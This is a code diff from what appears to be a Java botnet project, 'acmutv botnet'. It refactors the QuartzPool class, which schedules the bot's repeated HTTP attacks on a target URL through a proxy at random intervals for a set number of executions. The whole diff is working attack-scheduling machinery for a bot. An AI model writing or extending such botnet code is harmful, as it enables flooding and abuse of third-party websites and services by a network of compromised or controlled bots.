@@ -24,16 +24,10 @@
   THE SOFTWARE.
  */
 
-package com.acmutv.botnet.core.pool;
+package com.acmutv.botnet.core.exec;
 
-import com.acmutv.botnet.core.attack.Attacker;
-import com.acmutv.botnet.core.attack.HttpAttacker;
-import com.acmutv.botnet.core.attack.quartz.QuartzAttacker;
-import com.acmutv.botnet.core.attack.quartz.QuartzHttpAttacker;
-import com.acmutv.botnet.core.pool.task.ExecutorServiceKiller;
-import com.acmutv.botnet.tool.net.HttpMethod;
-import com.acmutv.botnet.tool.runtime.RuntimeManager;
-import com.acmutv.botnet.tool.time.Duration;
+import com.acmutv.botnet.core.attack.HttpAttack;
+import com.acmutv.botnet.core.attack.QuartzHttpAttacker;
 import lombok.Data;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
@@ -42,9 +36,6 @@ import org.quartz.impl.StdSchedulerFactory;
 import org.quartz.impl.matchers.GroupMatcher;
 
 import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
-import java.util.concurrent.TimeUnit;
 
 /**
  * This class realizes bot's thread pool, both fixed and scheduled.
@@ -89,27 +80,31 @@ public class QuartzPool {
     this.scheduler = factory.getScheduler();
   }
 
-  public void scheduleAttackHttp(HttpAttacker attack) throws SchedulerException {
+  /**
+   * Schedules the {@code attack}.
+   * @param attack the attack to schedule.
+   * @throws SchedulerException when the attack cannot be scheduled.
+   */
+  public void scheduleAttackHttp(HttpAttack attack) throws SchedulerException {
     final JobKey jobKey = JobKey.jobKey(JOB_GROUP_ATTACKS_HTTP);
     final TriggerKey triggerKey = TriggerKey.triggerKey(JOB_GROUP_ATTACKS_HTTP);
-    final String description = String.format(
-        "BOT attack HTTP %s with target %s through proxy %s with params %s",
-        attack.getMethod(),
-        attack.getTarget().getUrl(),
-        attack.getTarget().getProxy().toCompactString(),
-        attack.getProperties());
-    final Duration randomDuration = attack.getTarget().getPeriod().getRandomDuration();
-    final long intervalMillis = TimeUnit.MILLISECONDS.convert(randomDuration.getAmount(), randomDuration.getUnit());
-    final int repetitions = (int)attack.getTarget().getMaxAttempts();
+
+    JobDataMap jdata = new JobDataMap();
+    jdata.put("method", attack.getMethod());
+    jdata.put("target", attack.getTarget());
+    jdata.put("proxy", attack.getProxy());
+    jdata.put("properties", attack.getProperties());
+    jdata.put("executions", attack.getExecutions());
 
     JobDetail job = JobBuilder.newJob(QuartzHttpAttacker.class)
         .withIdentity(jobKey)
-        .withDescription(description)
         .build();
+
+    final long intervalMillis = attack.getPeriod().getRandomDuration().toMillis();
+    final int repetitions = attack.getExecutions() - 1;
 
     Trigger trigger = TriggerBuilder.newTrigger()
         .withIdentity(triggerKey)
-        .withDescription(description)
         .withSchedule(SimpleScheduleBuilder.simpleSchedule()
             .withIntervalInMilliseconds(intervalMillis)
             .withRepeatCount(repetitions)
